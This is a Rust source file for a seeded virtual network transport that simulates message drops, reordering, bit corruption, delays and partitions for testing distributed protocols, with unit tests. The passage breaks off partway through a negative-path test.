//! bd-2ko: Virtual Transport Layer for deterministic lab runtime (Section 10.11).
//!
//! Product-layer virtual transport integration that bridges the canonical 10.14
//! virtual transport fault harness into the testing module. Provides a
//! deterministic, seed-based transport simulation layer with configurable fault
//! injection (drops, reordering, corruption, partitions) for multi-node
//! distributed protocol testing.
//!
//! Schema version: vt-v1.0

use std::collections::BTreeMap;
use std::fmt;

use serde::{Deserialize, Serialize};

fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
    if cap == 0 {
        items.clear();
        return;
    }
    if items.len() >= cap {
        let overflow = items.len().saturating_sub(cap).saturating_add(1);
        items.drain(0..overflow.min(items.len()));
    }
    items.push(item);
}

// ── Constants ────────────────────────────────────────────────────────────────

pub const SCHEMA_VERSION: &str = "vt-v1.0";
pub const BEAD_ID: &str = "bd-2ko";
pub const SECTION: &str = "10.11";
pub const DEFAULT_MAX_EVENT_LOG_ENTRIES: usize = 4_096;

fn default_max_event_log_capacity() -> usize {
    DEFAULT_MAX_EVENT_LOG_ENTRIES
}

// ── Event codes ──────────────────────────────────────────────────────────────

pub mod event_codes {
    /// Message successfully sent through the transport layer.
    pub const VT_001: &str = "VT-001";
    /// Message dropped due to fault injection.
    pub const VT_002: &str = "VT-002";
    /// Message reordered in the delivery buffer.
    pub const VT_003: &str = "VT-003";
    /// Message payload corrupted (bit flips applied).
    pub const VT_004: &str = "VT-004";
    /// Network partition activated on a link.
    pub const VT_005: &str = "VT-005";
    /// Network partition healed on a link.
    pub const VT_006: &str = "VT-006";
    /// New transport link created.
    pub const VT_007: &str = "VT-007";
    /// Transport link destroyed.
    pub const VT_008: &str = "VT-008";
}

// ── Error codes ──────────────────────────────────────────────────────────────

pub mod error_codes {
    /// Attempted to create a link with an ID that already exists.
    pub const ERR_VT_LINK_EXISTS: &str = "ERR_VT_LINK_EXISTS";
    /// Referenced link ID does not exist in the transport layer.
    pub const ERR_VT_LINK_NOT_FOUND: &str = "ERR_VT_LINK_NOT_FOUND";
    /// Drop probability is outside the valid range [0.0, 1.0].
    pub const ERR_VT_INVALID_PROBABILITY: &str = "ERR_VT_INVALID_PROBABILITY";
    /// Link is partitioned; message delivery is blocked.
    pub const ERR_VT_PARTITIONED: &str = "ERR_VT_PARTITIONED";
    /// Message IDs are exhausted; no unique IDs remain.
    pub const ERR_VT_MESSAGE_ID_EXHAUSTED: &str = "ERR_VT_MESSAGE_ID_EXHAUSTED";
}

// ── Invariants ───────────────────────────────────────────────────────────────

pub mod invariants {
    /// Same seed produces identical message sequences and fault outcomes.
    pub const INV_VT_DETERMINISTIC: &str = "INV-VT-DETERMINISTIC";
    /// Messages within a non-reordered link are delivered in FIFO order.
    pub const INV_VT_DELIVERY_ORDER: &str = "INV-VT-DELIVERY-ORDER";
    /// Observed drop rate converges to the configured probability.
    pub const INV_VT_DROP_RATE: &str = "INV-VT-DROP-RATE";
    /// Corruption applies exactly the configured number of bit flips.
    pub const INV_VT_CORRUPT_BITS: &str = "INV-VT-CORRUPT-BITS";
}

// ── Types ────────────────────────────────────────────────────────────────────

/// Configuration for link-level fault injection.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct LinkFaultConfig {
    /// Probability that a message is silently dropped. Range: [0.0, 1.0].
    pub drop_probability: f64,
    /// Maximum depth for reorder buffer. 0 means no reordering.
    pub reorder_depth: usize,
    /// Number of bits to flip per corrupted message. 0 means no corruption.
    pub corrupt_bit_count: usize,
    /// Fixed delay in ticks before a message is delivered.
    pub delay_ticks: u64,
    /// Whether the link is fully partitioned (no messages pass).
    pub partition: bool,
}

impl Default for LinkFaultConfig {
    fn default() -> Self {
        Self {
            drop_probability: 0.0,
            reorder_depth: 0,
            corrupt_bit_count: 0,
            delay_ticks: 0,
            partition: false,
        }
    }
}

impl LinkFaultConfig {
    /// Create a fault-free configuration.
    pub fn no_faults() -> Self {
        Self::default()
    }

    /// Validate configuration constraints.
    pub fn validate(&self) -> Result<(), VirtualTransportError> {
        if !(0.0..=1.0).contains(&self.drop_probability) {
            return Err(VirtualTransportError::InvalidProbability {
                field: "drop_probability".to_string(),
                value: self.drop_probability,
            });
        }
        Ok(())
    }
}

/// A message in transit through the virtual transport layer.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Message {
    /// Unique message identifier.
    pub id: u64,
    /// Source node identifier.
    pub source: String,
    /// Target node identifier.
    pub target: String,
    /// Raw payload bytes.
    pub payload: Vec<u8>,
    /// Tick at which the message was created/sent.
    pub tick_created: u64,
    /// Tick at which the message was delivered (None if not yet delivered).
    pub tick_delivered: Option<u64>,
}

impl fmt::Display for Message {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "Message(id={}, {}->{}; {} bytes, tick={})",
            self.id,
            self.source,
            self.target,
            self.payload.len(),
            self.tick_created
        )
    }
}

/// State of a single transport link between two nodes.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LinkState {
    /// Source node identifier.
    pub source: String,
    /// Target node identifier.
    pub target: String,
    /// Fault injection configuration for this link.
    pub config: LinkFaultConfig,
    /// Buffered messages awaiting delivery.
    pub buffer: Vec<Message>,
    /// Whether the link is currently active.
    pub active: bool,
}

impl LinkState {
    /// Create a new active link with the given fault configuration.
    pub fn new(source: String, target: String, config: LinkFaultConfig) -> Self {
        Self {
            source,
            target,
            config,
            buffer: Vec::new(),
            active: true,
        }
    }

    /// Returns the canonical link identifier: "source->target".
    pub fn link_id(&self) -> String {
        format!("{}->{}", self.source, self.target)
    }
}

/// Events emitted by the virtual transport layer during simulation.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum TransportEvent {
    /// A message was successfully sent and enqueued.
    MessageSent {
        event_code: String,
        message_id: u64,
        link_id: String,
    },
    /// A message was dropped due to fault injection.
    MessageDropped {
        event_code: String,
        message_id: u64,
        link_id: String,
    },
    /// A message was reordered in the delivery buffer.
    MessageReordered {
        event_code: String,
        message_id: u64,
        link_id: String,
        new_position: usize,
    },
    /// A message payload was corrupted (bits flipped).
    MessageCorrupted {
        event_code: String,
        message_id: u64,
        link_id: String,
        bits_flipped: usize,
    },
    /// A partition was activated on a link.
    PartitionActivated { event_code: String, link_id: String },
    /// A partition was healed on a link.
    PartitionHealed { event_code: String, link_id: String },
}

impl TransportEvent {
    /// Return the event code string for this event.
    pub fn event_code(&self) -> &str {
        match self {
            TransportEvent::MessageSent { event_code, .. } => event_code,
            TransportEvent::MessageDropped { event_code, .. } => event_code,
            TransportEvent::MessageReordered { event_code, .. } => event_code,
            TransportEvent::MessageCorrupted { event_code, .. } => event_code,
            TransportEvent::PartitionActivated { event_code, .. } => event_code,
            TransportEvent::PartitionHealed { event_code, .. } => event_code,
        }
    }
}

/// Errors from the virtual transport layer.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum VirtualTransportError {
    /// A link with the given ID already exists.
    LinkExists { link_id: String },
    /// No link found with the given ID.
    LinkNotFound { link_id: String },
    /// A probability value is outside [0.0, 1.0].
    InvalidProbability { field: String, value: f64 },
    /// The link is partitioned and cannot deliver messages.
    Partitioned { link_id: String },
    /// No unique message IDs remain.
    MessageIdExhausted,
}

impl fmt::Display for VirtualTransportError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            VirtualTransportError::LinkExists { link_id } => {
                write!(f, "{}: {}", error_codes::ERR_VT_LINK_EXISTS, link_id)
            }
            VirtualTransportError::LinkNotFound { link_id } => {
                write!(f, "{}: {}", error_codes::ERR_VT_LINK_NOT_FOUND, link_id)
            }
            VirtualTransportError::InvalidProbability { field, value } => {
                write!(
                    f,
                    "{}: {}={}",
                    error_codes::ERR_VT_INVALID_PROBABILITY,
                    field,
                    value
                )
            }
            VirtualTransportError::Partitioned { link_id } => {
                write!(f, "{}: {}", error_codes::ERR_VT_PARTITIONED, link_id)
            }
            VirtualTransportError::MessageIdExhausted => {
                write!(f, "{}", error_codes::ERR_VT_MESSAGE_ID_EXHAUSTED)
            }
        }
    }
}

/// Transport layer statistics snapshot.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct TransportStats {
    pub total_messages: u64,
    pub dropped_messages: u64,
    pub reordered_messages: u64,
    pub corrupted_messages: u64,
    pub delivered_messages: u64,
    pub active_links: usize,
    pub partitioned_links: usize,
}

// ── Simple deterministic PRNG ────────────────────────────────────────────────

/// Minimal xorshift64 PRNG for deterministic fault injection.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct Xorshift64 {
    state: u64,
}

impl Xorshift64 {
    fn new(seed: u64) -> Self {
        // Ensure non-zero state.
        Self {
            state: if seed == 0 { 1 } else { seed },
        }
    }

    fn next_u64(&mut self) -> u64 {
        let mut x = self.state;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.state = x;
        x
    }

    /// Return a float in [0.0, 1.0).
    fn next_f64(&mut self) -> f64 {
        (self.next_u64() >> 11) as f64 / ((1u64 << 53) as f64)
    }
}

// ── Core: VirtualTransportLayer ──────────────────────────────────────────────

/// The virtual transport layer simulates a network of links between nodes
/// with configurable, deterministic fault injection.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VirtualTransportLayer {
    /// All links keyed by their canonical link_id ("source->target").
    pub links: BTreeMap<String, LinkState>,
    /// Seed used to initialize the deterministic PRNG.
    pub rng_seed: u64,
    /// Total messages sent through this transport layer.
    pub total_messages: u64,
    /// Total messages dropped by fault injection.
    pub dropped_messages: u64,
    /// Total messages reordered by fault injection.
    pub reordered_messages: u64,
    /// Total messages corrupted by fault injection.
    pub corrupted_messages: u64,
    /// Internal PRNG state for deterministic fault decisions.
    rng: Xorshift64,
    /// Next message ID to assign.
    next_message_id: u64,
    /// Current simulation tick.
    current_tick: u64,
    /// Accumulated event log.
    event_log: Vec<TransportEvent>,
    #[serde(default = "default_max_event_log_capacity")]
    max_event_log_entries: usize,
}

impl VirtualTransportLayer {
    /// Create a new virtual transport layer with the given seed.
    pub fn new(rng_seed: u64) -> Self {
        Self::with_event_log_capacity(rng_seed, DEFAULT_MAX_EVENT_LOG_ENTRIES)
    }

    /// Create a new transport layer with explicit event-log capacity.
    pub fn with_event_log_capacity(rng_seed: u64, max_event_log_entries: usize) -> Self {
        Self {
            links: BTreeMap::new(),
            rng_seed,
            total_messages: 0,
            dropped_messages: 0,
            reordered_messages: 0,
            corrupted_messages: 0,
            rng: Xorshift64::new(rng_seed),
            next_message_id: 1,
            current_tick: 0,
            event_log: Vec::new(),
            max_event_log_entries: max_event_log_entries.max(1),
        }
    }

    /// Return the current simulation tick.
    pub fn current_tick(&self) -> u64 {
        self.current_tick
    }

    /// Advance the simulation clock by the given number of ticks.
    pub fn advance_tick(&mut self, ticks: u64) {
        self.current_tick = self.current_tick.saturating_add(ticks);
    }

    /// Access the full event log.
    pub fn event_log(&self) -> &[TransportEvent] {
        &self.event_log
    }

    /// Return the configured event-log capacity.
    pub fn event_log_capacity(&self) -> usize {
        self.max_event_log_entries
    }

    /// Return a snapshot of transport statistics.
    pub fn stats(&self) -> TransportStats {
        let active_links = self
            .links
            .values()
            .filter(|l| l.active && !l.config.partition)
            .count();
        let partitioned_links = self.links.values().filter(|l| l.config.partition).count();
        let buffered_messages = self
            .links
            .values()
            .map(|link| u64::try_from(link.buffer.len()).unwrap_or(u64::MAX))
            .fold(0_u64, u64::saturating_add);
        let delivered = self
            .total_messages
            .saturating_sub(self.dropped_messages)
            .saturating_sub(buffered_messages);
        TransportStats {
            total_messages: self.total_messages,
            dropped_messages: self.dropped_messages,
            reordered_messages: self.reordered_messages,
            corrupted_messages: self.corrupted_messages,
            delivered_messages: delivered,
            active_links,
            partitioned_links,
        }
    }

    /// Create a new link between two nodes.
    pub fn create_link(
        &mut self,
        source: &str,
        target: &str,
        config: LinkFaultConfig,
    ) -> Result<String, VirtualTransportError> {
        config.validate()?;
        let link_id = format!("{}->{}", source, target);
        if self.links.contains_key(&link_id) {
            return Err(VirtualTransportError::LinkExists {
                link_id: link_id.clone(),
            });
        }
        let state = LinkState::new(source.to_string(), target.to_string(), config);
        self.links.insert(link_id.clone(), state);
        self.push_event(TransportEvent::MessageSent {
            event_code: event_codes::VT_007.to_string(),
            message_id: 0,
            link_id: link_id.clone(),
        });
        Ok(link_id)
    }

    /// Destroy a link, returning any buffered messages.
    pub fn destroy_link(&mut self, link_id: &str) -> Result<Vec<Message>, VirtualTransportError> {
        let state =
            self.links
                .remove(link_id)
                .ok_or_else(|| VirtualTransportError::LinkNotFound {
                    link_id: link_id.to_string(),
                })?;
        self.push_event(TransportEvent::MessageSent {
            event_code: event_codes::VT_008.to_string(),
            message_id: 0,
            link_id: link_id.to_string(),
        });
        Ok(state.buffer)
    }

    /// Activate a partition on the given link.
    pub fn activate_partition(&mut self, link_id: &str) -> Result<(), VirtualTransportError> {
        let link =
            self.links
                .get_mut(link_id)
                .ok_or_else(|| VirtualTransportError::LinkNotFound {
                    link_id: link_id.to_string(),
                })?;
        link.config.partition = true;
        self.push_event(TransportEvent::PartitionActivated {
            event_code: event_codes::VT_005.to_string(),
            link_id: link_id.to_string(),
        });
        Ok(())
    }

    /// Heal a partition on the given link.
    pub fn heal_partition(&mut self, link_id: &str) -> Result<(), VirtualTransportError> {
        let link =
            self.links
                .get_mut(link_id)
                .ok_or_else(|| VirtualTransportError::LinkNotFound {
                    link_id: link_id.to_string(),
                })?;
        link.config.partition = false;
        self.push_event(TransportEvent::PartitionHealed {
            event_code: event_codes::VT_006.to_string(),
            link_id: link_id.to_string(),
        });
        Ok(())
    }

    /// Send a message through the transport layer.
    ///
    /// The message traverses the fault injection pipeline:
    /// 1. Partition check (immediate reject if partitioned).
    /// 2. Drop decision based on `drop_probability`.
    /// 3. Corruption based on `corrupt_bit_count`.
    /// 4. Reordering based on `reorder_depth`.
    /// 5. Enqueue into the link buffer.
    pub fn send_message(
        &mut self,
        source: &str,
        target: &str,
        payload: Vec<u8>,
    ) -> Result<u64, VirtualTransportError> {
        let link_id = format!("{}->{}", source, target);
        // Check link exists and is not partitioned.
        {
            let link =
                self.links
                    .get(&link_id)
                    .ok_or_else(|| VirtualTransportError::LinkNotFound {
                        link_id: link_id.clone(),
                    })?;
            if link.config.partition {
                return Err(VirtualTransportError::Partitioned {
                    link_id: link_id.clone(),
                });
            }
        }

        if self.next_message_id == 0 {
            return Err(VirtualTransportError::MessageIdExhausted);
        }

        let msg_id = self.next_message_id;
        self.next_message_id = msg_id.checked_add(1).unwrap_or(0);
        self.total_messages = self.total_messages.saturating_add(1);

        // Read config values before mutable borrow.
        let drop_prob;
        let corrupt_bits;
        let reorder_depth;
        {
            let link =
                self.links
                    .get(&link_id)
                    .ok_or_else(|| VirtualTransportError::LinkNotFound {
                        link_id: link_id.clone(),
                    })?;
            drop_prob = link.config.drop_probability;
            corrupt_bits = link.config.corrupt_bit_count;
            reorder_depth = link.config.reorder_depth;
        }

        // Drop decision.
        let roll = self.rng.next_f64();
        if roll < drop_prob {
            self.dropped_messages = self.dropped_messages.saturating_add(1);
            self.push_event(TransportEvent::MessageDropped {
                event_code: event_codes::VT_002.to_string(),
                message_id: msg_id,
                link_id: link_id.clone(),
            });
            return Ok(msg_id);
        }

        // Build the message.
        let mut msg_payload = payload;

        // Corruption.
        if corrupt_bits > 0 && !msg_payload.is_empty() {
            let bits_flipped = self.apply_corruption(&mut msg_payload, corrupt_bits);
            self.corrupted_messages = self.corrupted_messages.saturating_add(1);
            self.push_event(TransportEvent::MessageCorrupted {
                event_code: event_codes::VT_004.to_string(),
                message_id: msg_id,
                link_id: link_id.clone(),
                bits_flipped,
            });
        }

        let msg = Message {
            id: msg_id,
            source: source.to_string(),
            target: target.to_string(),
            payload: msg_payload,
            tick_created: self.current_tick,
            tick_delivered: None,
        };

        // Enqueue with potential reordering.
        let link =
            self.links
                .get_mut(&link_id)
                .ok_or_else(|| VirtualTransportError::LinkNotFound {
                    link_id: link_id.clone(),
                })?;

        if reorder_depth > 0 && link.buffer.len() >= reorder_depth {
            // Insert at a deterministic position within the reorder window.
            let pos_raw = self.rng.next_u64() as usize;
            let window_start = if link.buffer.len() >= reorder_depth {
                link.buffer.len() - reorder_depth
            } else {
                0
            };
            let window_size = link.buffer.len() - window_start + 1;
            let insert_pos = window_start + (pos_raw % window_size);

            link.buffer.insert(insert_pos, msg);
            self.reordered_messages = self.reordered_messages.saturating_add(1);
            self.push_event(TransportEvent::MessageReordered {
                event_code: event_codes::VT_003.to_string(),
                message_id: msg_id,
                link_id: link_id.clone(),
                new_position: insert_pos,
            });
        } else {
            // Normal FIFO enqueue.
            link.buffer.push(msg);
            self.push_event(TransportEvent::MessageSent {
                event_code: event_codes::VT_001.to_string(),
                message_id: msg_id,
                link_id: link_id.clone(),
            });
        }

        Ok(msg_id)
    }

    /// Deliver the next message from a link's buffer, respecting delay.
    pub fn deliver_next(
        &mut self,
        link_id: &str,
    ) -> Result<Option<Message>, VirtualTransportError> {
        let link =
            self.links
                .get_mut(link_id)
                .ok_or_else(|| VirtualTransportError::LinkNotFound {
                    link_id: link_id.to_string(),
                })?;

        if link.config.partition {
            return Err(VirtualTransportError::Partitioned {
                link_id: link_id.to_string(),
            });
        }

        if link.buffer.is_empty() {
            return Ok(None);
        }

        let delay = link.config.delay_ticks;
        let tick = self.current_tick;

        // Find the first message eligible for delivery (respecting delay).
        let eligible_idx = link
            .buffer
            .iter()
            .position(|msg| tick >= msg.tick_created.saturating_add(delay));

        match eligible_idx {
            Some(idx) => {
                let mut msg = link.buffer.remove(idx);
                msg.tick_delivered = Some(tick);
                Ok(Some(msg))
            }
            None => Ok(None),
        }
    }

    /// Deliver all eligible messages from a link.
    pub fn deliver_all(&mut self, link_id: &str) -> Result<Vec<Message>, VirtualTransportError> {
        let mut delivered = Vec::new();
        while let Some(msg) = self.deliver_next(link_id)? {
            delivered.push(msg);
        }
        Ok(delivered)
    }

    /// Return the number of buffered (in-flight) messages on a link.
    pub fn buffered_count(&self, link_id: &str) -> Result<usize, VirtualTransportError> {
        let link = self
            .links
            .get(link_id)
            .ok_or_else(|| VirtualTransportError::LinkNotFound {
                link_id: link_id.to_string(),
            })?;
        Ok(link.buffer.len())
    }

    /// Return the total number of links.
    pub fn link_count(&self) -> usize {
        self.links.len()
    }

    /// Update the fault configuration on an existing link.
    pub fn update_link_config(
        &mut self,
        link_id: &str,
        config: LinkFaultConfig,
    ) -> Result<(), VirtualTransportError> {
        config.validate()?;
        let link =
            self.links
                .get_mut(link_id)
                .ok_or_else(|| VirtualTransportError::LinkNotFound {
                    link_id: link_id.to_string(),
                })?;
        link.config = config;
        Ok(())
    }

    /// Reset the transport layer to its initial state (keeps seed).
    pub fn reset(&mut self) {
        self.links.clear();
        self.total_messages = 0;
        self.dropped_messages = 0;
        self.reordered_messages = 0;
        self.corrupted_messages = 0;
        self.rng = Xorshift64::new(self.rng_seed);
        self.next_message_id = 1;
        self.current_tick = 0;
        self.event_log.clear();
    }

    /// Apply bit-level corruption to a payload. Returns actual bits flipped.
    fn apply_corruption(&mut self, payload: &mut [u8], bit_count: usize) -> usize {
        if payload.is_empty() {
            return 0;
        }
        let total_bits = payload.len() * 8;
        let actual_flips = bit_count.min(total_bits);
        for _ in 0..actual_flips {
            let bit_pos = (self.rng.next_u64() as usize) % total_bits;
            let byte_idx = bit_pos / 8;
            let bit_idx = bit_pos % 8;
            payload[byte_idx] ^= 1 << bit_idx;
        }
        actual_flips
    }

    fn push_event(&mut self, event: TransportEvent) {
        let cap = self.max_event_log_entries;
        push_bounded(&mut self.event_log, event, cap);
    }
}

impl Default for VirtualTransportLayer {
    fn default() -> Self {
        Self::new(42)
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // -- Test 1: schema version
    #[test]
    fn test_schema_version() {
        assert_eq!(SCHEMA_VERSION, "vt-v1.0");
        assert_eq!(BEAD_ID, "bd-2ko");
        assert_eq!(SECTION, "10.11");
    }

    // -- Test 2: create and destroy links
    #[test]
    fn test_create_and_destroy_link() {
        let mut vt = VirtualTransportLayer::new(42);
        let link_id = vt
            .create_link("node_a", "node_b", LinkFaultConfig::no_faults())
            .unwrap();
        assert_eq!(link_id, "node_a->node_b");
        assert_eq!(vt.link_count(), 1);

        let buffered = vt.destroy_link(&link_id).unwrap();
        assert!(buffered.is_empty());
        assert_eq!(vt.link_count(), 0);
    }

    // -- Test 3: duplicate link rejected
    #[test]
    fn test_duplicate_link_rejected() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();
        let err = vt
            .create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap_err();
        assert!(matches!(err, VirtualTransportError::LinkExists { .. }));
        let msg = format!("{}", err);
        assert!(msg.contains("ERR_VT_LINK_EXISTS"));
    }

    // -- Test 4: link not found error
    #[test]
    fn test_link_not_found() {
        let mut vt = VirtualTransportLayer::new(42);
        let err = vt.destroy_link("nonexistent->link").unwrap_err();
        assert!(matches!(err, VirtualTransportError::LinkNotFound { .. }));
        let msg = format!("{}", err);
        assert!(msg.contains("ERR_VT_LINK_NOT_FOUND"));
    }

    // -- Test 5: send and deliver message (no faults)
    #[test]
    fn test_send_and_deliver_no_faults() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();

        let payload = b"hello world".to_vec();
        let msg_id = vt.send_message("a", "b", payload.clone()).unwrap();
        assert!(msg_id > 0);
        assert_eq!(vt.total_messages, 1);

        let delivered = vt.deliver_next("a->b").unwrap().unwrap();
        assert_eq!(delivered.id, msg_id);
        assert_eq!(delivered.payload, payload);
        assert_eq!(delivered.source, "a");
        assert_eq!(delivered.target, "b");
        assert_eq!(delivered.tick_delivered, Some(0));
    }

    // -- Test 6: message delivery respects delay_ticks
    #[test]
    fn test_delay_ticks() {
        let mut vt = VirtualTransportLayer::new(42);
        let config = LinkFaultConfig {
            delay_ticks: 5,
            ..Default::default()
        };
        vt.create_link("a", "b", config).unwrap();
        vt.send_message("a", "b", b"delayed".to_vec()).unwrap();

        // At tick 0, message should not be deliverable (created at 0, delay=5).
        let result = vt.deliver_next("a->b").unwrap();
        assert!(result.is_none());

        // Advance to tick 5: now eligible.
        vt.advance_tick(5);
        let delivered = vt.deliver_next("a->b").unwrap().unwrap();
        assert_eq!(delivered.payload, b"delayed".to_vec());
        assert_eq!(delivered.tick_delivered, Some(5));
    }

    // -- Test 7: partition blocks send
    #[test]
    fn test_partition_blocks_send() {
        let mut vt = VirtualTransportLayer::new(42);
        let config = LinkFaultConfig {
            partition: true,
            ..Default::default()
        };
        vt.create_link("a", "b", config).unwrap();

        let err = vt.send_message("a", "b", b"blocked".to_vec()).unwrap_err();
        assert!(matches!(err, VirtualTransportError::Partitioned { .. }));
        let msg = format!("{}", err);
        assert!(msg.contains("ERR_VT_PARTITIONED"));
    }

    // -- Test 8: activate and heal partition
    #[test]
    fn test_activate_heal_partition() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();

        // Send works before partition.
        vt.send_message("a", "b", b"before".to_vec()).unwrap();

        // Activate partition.
        vt.activate_partition("a->b").unwrap();
        let err = vt.send_message("a", "b", b"during".to_vec()).unwrap_err();
        assert!(matches!(err, VirtualTransportError::Partitioned { .. }));

        // Heal partition.
        vt.heal_partition("a->b").unwrap();
        vt.send_message("a", "b", b"after".to_vec()).unwrap();
        assert_eq!(vt.total_messages, 2); // before + after (during was rejected)
    }

    // -- Test 9: drop probability drops messages
    #[test]
    fn test_drop_probability() {
        let mut vt = VirtualTransportLayer::new(42);
        let config = LinkFaultConfig {
            drop_probability: 1.0,
            ..Default::default()
        };
        vt.create_link("a", "b", config).unwrap();

        for i in 0..10 {
            vt.send_message("a", "b", vec![i]).unwrap();
        }

        assert_eq!(vt.total_messages, 10);
        assert_eq!(vt.dropped_messages, 10);
        assert_eq!(vt.buffered_count("a->b").unwrap(), 0);
    }

    // -- Test 10: zero drop probability delivers all
    #[test]
    fn test_zero_drop_delivers_all() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();

        for i in 0..5 {
            vt.send_message("a", "b", vec![i]).unwrap();
        }

        assert_eq!(vt.dropped_messages, 0);
        assert_eq!(vt.buffered_count("a->b").unwrap(), 5);

        let delivered = vt.deliver_all("a->b").unwrap();
        assert_eq!(delivered.len(), 5);
    }

    // -- Test 11: corruption flips bits
    #[test]
    fn test_corruption() {
        let mut vt = VirtualTransportLayer::new(42);
        let config = LinkFaultConfig {
            corrupt_bit_count: 3,
            ..Default::default()
        };
        vt.create_link("a", "b", config).unwrap();

        let original = vec![0u8; 16];
        vt.send_message("a", "b", original.clone()).unwrap();
        assert_eq!(vt.corrupted_messages, 1);

        let delivered = vt.deliver_next("a->b").unwrap().unwrap();
        // At least some bytes should differ due to corruption.
        assert_ne!(delivered.payload, original);
    }

    // -- Test 12: deterministic replay (INV-VT-DETERMINISTIC)
    #[test]
    fn test_deterministic_replay() {
        fn run_scenario(seed: u64) -> Vec<u64> {
            let mut vt = VirtualTransportLayer::new(seed);
            let config = LinkFaultConfig {
                drop_probability: 0.3,
                corrupt_bit_count: 1,
                ..Default::default()
            };
            vt.create_link("a", "b", config).unwrap();

            let mut msg_ids = Vec::new();
            for i in 0..20 {
                let id = vt.send_message("a", "b", vec![i as u8; 8]).unwrap();
                msg_ids.push(id);
            }
            msg_ids.push(vt.dropped_messages);
            msg_ids.push(vt.corrupted_messages);
            msg_ids
        }

        let run1 = run_scenario(12345);
        let run2 = run_scenario(12345);
        assert_eq!(
            run1, run2,
            "INV-VT-DETERMINISTIC violated: same seed must produce same results"
        );
    }

    // -- Test 13: different seeds produce different results
    #[test]
    fn test_different_seeds_diverge() {
        fn run_with_seed(seed: u64) -> u64 {
            let mut vt = VirtualTransportLayer::new(seed);
            let config = LinkFaultConfig {
                drop_probability: 0.5,
                ..Default::default()
            };
            vt.create_link("a", "b", config).unwrap();
            for i in 0..100 {
                let _ = vt.send_message("a", "b", vec![i as u8]);
            }
            vt.dropped_messages
        }

        let d1 = run_with_seed(1);
        let d2 = run_with_seed(999);
        // With 100 messages at 50% drop, different seeds should yield different drop counts.
        // This is probabilistic but extremely unlikely to fail.
        assert_ne!(
            d1, d2,
            "Different seeds should produce different fault patterns"
        );
    }

    // -- Test 14: invalid drop probability rejected
    #[test]
    fn test_invalid_probability_rejected() {
        let mut vt = VirtualTransportLayer::new(42);
        let config = LinkFaultConfig {
            drop_probability: 1.5,
            ..Default::default()
        };
        let err = vt.create_link("a", "b", config).unwrap_err();
        assert!(matches!(
            err,
            VirtualTransportError::InvalidProbability { .. }
        ));
        let msg = format!("{}", err);
        assert!(msg.contains("ERR_VT_INVALID_PROBABILITY"));
    }

    // -- Test 15: stats snapshot
    #[test]
    fn test_stats_snapshot() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();
        vt.create_link(
            "b",
            "c",
            LinkFaultConfig {
                partition: true,
                ..Default::default()
            },
        )
        .unwrap();

        vt.send_message("a", "b", b"msg1".to_vec()).unwrap();
        vt.send_message("a", "b", b"msg2".to_vec()).unwrap();

        let stats = vt.stats();
        assert_eq!(stats.total_messages, 2);
        assert_eq!(stats.dropped_messages, 0);
        assert_eq!(stats.delivered_messages, 0);
        assert_eq!(stats.active_links, 1);
        assert_eq!(stats.partitioned_links, 1);
    }

    // -- Test 15b: delivered stats exclude buffered in-flight messages
    #[test]
    fn test_stats_delivered_messages_tracks_actual_delivery() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();

        vt.send_message("a", "b", b"msg1".to_vec()).unwrap();
        vt.send_message("a", "b", b"msg2".to_vec()).unwrap();

        let before_delivery = vt.stats();
        assert_eq!(before_delivery.total_messages, 2);
        assert_eq!(before_delivery.delivered_messages, 0);

        let delivered = vt.deliver_next("a->b").unwrap().unwrap();
        assert_eq!(delivered.payload, b"msg1".to_vec());

        let after_one_delivery = vt.stats();
        assert_eq!(after_one_delivery.delivered_messages, 1);
        assert_eq!(vt.buffered_count("a->b").unwrap(), 1);

        let remaining = vt.deliver_all("a->b").unwrap();
        assert_eq!(remaining.len(), 1);

        let after_all_delivery = vt.stats();
        assert_eq!(after_all_delivery.delivered_messages, 2);
    }

    // -- Test 16: event log records all events
    #[test]
    fn test_event_log() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults())
            .unwrap();
        vt.send_message("a", "b", b"test".to_vec()).unwrap();
        vt.activate_partition("a->b").unwrap();
        vt.heal_partition("a->b").unwrap();

        let log = vt.event_log();
        assert_eq!(log.len(), 4); // link_created, message_sent, partition_activated, partition_healed

        // Check partition events.
        let partition_events: Vec<_> = log
            .iter()
            .filter(|e| {
                matches!(
                    e,
                    TransportEvent::PartitionActivated { .. }
                        | TransportEvent::PartitionHealed { .. }
                )
            })
            .collect();
        assert_eq!(partition_events.len(), 2);
    }

    // ── NEGATIVE-PATH INLINE TESTS ─────────────────────────────────────────
    // Comprehensive edge case and boundary validation for security-critical functions

    /// Test push_bounded with extreme capacity and overflow scenarios
    #[test]
    fn test_push_bounded_negative_paths() {
        // Zero capacity - should clear and not add item
        let mut vec = vec![1, 2, 3];
        push_bounded(&mut vec, 999, 0);
        assert!(vec.is_empty());

        // Capacity 1 with existing items - should drain and add
        let mut vec = vec![1, 2, 3, 4, 5];
        push_bounded(&mut vec, 999, 1);
